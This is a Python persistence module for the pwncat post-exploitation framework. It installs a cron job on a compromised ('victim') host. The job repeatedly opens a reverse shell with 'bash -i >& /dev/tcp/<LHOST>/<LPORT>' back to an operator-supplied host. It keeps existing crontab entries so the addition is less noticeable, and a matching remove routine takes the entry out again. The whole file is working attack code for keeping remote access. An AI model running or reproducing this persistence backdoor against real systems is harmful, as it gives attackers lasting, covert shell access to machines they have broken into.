import os
from pwncat import util
from pwncat.persist import PersistenceMethod, PersistenceError
from pwncat.util import Access, CompilationError, console
import pwncat


class Method(PersistenceMethod):
    system = False
    name = "cron"
    local = True
    #Source Begins Here
    def install(self, user):
        # Setting Variables for Callback. Cron syntax is not verified
        # An error in the crontab syntax does not disrupt current crons
        cron = str(input("Input Cron Scedule: ")).strip()
        rhost = str(input("LHOST? ")).strip()
        rport = str(input("LPORT? ")).strip()
        # Listing all crons and creating a temp file so we can make sure that all currently installed crons stay that way
        # Bash oneliner using "pwncat" string to differentiate our cron from any existing ones
        # Installing original list of crons, with the reverse shell added to it 
        pwncat.victim.run("crontab -l 2> /dev/null > /dev/shm/.cron; echo \"" + cron + " echo pwncat && bash -c 'bash -i >& /dev/tcp/" + rhost + "/" + rport + " 0>&1'\" >> /dev/shm/.cron && crontab /dev/shm/.cron && rm /dev/shm/.cron")
        print(str("Calling back to " + rhost + ":" + rport + " on a " + cron + " schedule."))
    def remove(self, user):
        # Using "pwncat" string to remove our crons and reinstalling the original ones
        pwncat.victim.run("crontab -l | grep -v pwncat > /dev/shm/.cron; crontab /dev/shm/.cron && rm /dev/shm/.cron")